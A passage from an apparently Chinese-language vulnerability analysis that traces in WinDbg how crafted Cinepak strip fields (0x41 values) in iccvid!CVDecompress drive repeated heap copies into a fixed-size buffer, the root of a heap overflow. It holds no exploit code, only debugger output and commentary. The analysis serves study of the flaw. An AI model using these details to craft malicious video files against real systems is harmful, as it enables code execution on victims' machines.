class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba692b=<span class="number">41</span> <span class="comment">; al = 0x41,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6927=<span class="number">41</span> <span class="comment">; cl = 0x41,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                        <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0,[(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">00000000</span> <span class="comment">; a2 = eax = 0x00000000 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span> <span class="comment">; </span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00004000</span> <span class="comment">; eax = [ebp-4] = 0x4000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 为0则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x102</span>:</span><br><span class="line">73b722b0 807d1300        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="number">0</span>       <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; 判断a3(Len_of_CVID_data)的最高字节是否为0,Frame Header的Flags</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x106</span>:</span><br><span class="line">73b722b4 751b            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x108</span>:</span><br><span class="line">73b722b6 803e11          <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">11h</span>         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6922=<span class="number">11</span> <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10b</span>:</span><br><span class="line">73b722b9 <span class="number">7516</span>            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722bb <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10d</span>:</span><br><span class="line">73b722bb 8b4b1c          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">1Ch</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535cc=001535f8 <span class="comment">; ebx = a1 = 001535b0,ecx = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722be <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x110</span>:</span><br><span class="line">73b722be 8d3c01          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">ecx</span>+<span class="built_in">eax</span>]                                  <span class="comment">; edi = 0x001575f8,堆块数据区域指针增加0x4000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x113</span>:</span><br><span class="line">73b722c1 b900080000      <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="number">800h</span>                                       <span class="comment">; ecx = 0x800,复制数据长度</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x118</span>:</span><br><span class="line">73b722c6 8db700e0ffff    <span class="keyword">lea</span>     <span class="built_in">esi</span>,[<span class="built_in">edi</span>-<span class="number">2000h</span>]                                <span class="comment">; esi = 0x001555f8,堆块数据区域指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001555f8 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第2次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; !heap -p -a <span class="built_in">edi</span></span><br><span class="line">    address 001575f8 found <span class="keyword">in</span></span><br><span class="line">    _HEAP @ <span class="number">90000</span></span><br><span class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">        001535f0 0c01 <span class="number">0000</span>  [<span class="number">01</span>]   001535f8    <span class="number">06000</span> - (busy)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过<code>以上分析</code>及<code>CVDecompress函数</code>的<code>名字</code>，我们可以基本分析出<code>CVDecompress函数</code>的<code>功能</code>，其功能是解码<code>Cinepak(CVID)编解码器</code>编码的<code>视频数据</code>。只有<code>“Strip CVID ID”</code>为<code>0x1100</code>时，才进行<code>堆块内存复制</code>。上面的分析<code>未分析完全</code>，只分析到<code>第二次</code>堆块内存复制，<code>完整的过程</code>如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00157680</span> <span class="built_in">edi</span>=<span class="number">00159680</span></span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第1次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; !heap -p -a <span class="built_in">edi</span></span><br><span class="line">    address <span class="number">00159680</span> found <span class="keyword">in</span></span><br><span class="line">    _HEAP @ <span class="number">90000</span></span><br><span class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">        <span class="number">00157678</span> 0c01 <span class="number">0000</span>  [<span class="number">01</span>]   <span class="number">00157680</span>    <span class="number">06000</span> - (busy)</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00159680</span> <span class="built_in">edi</span>=0015b680</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0259fd18=00ba6912</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; be <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=<span class="number">00159680</span> <span class="built_in">edi</span>=0015b680</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第2次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; bd <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015b680 <span class="built_in">edi</span>=0015d680</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:0259fd18=00ba6922</span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; be <span class="number">1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">012</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">1</span> hit</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00006000</span> <span class="built_in">ebx</span>=<span class="number">00157638</span> <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=0259fd38 <span class="built_in">esi</span>=0015b680 <span class="built_in">edi</span>=0015d680</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=0259fd04 <span class="built_in">ebp</span>=0259fd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span 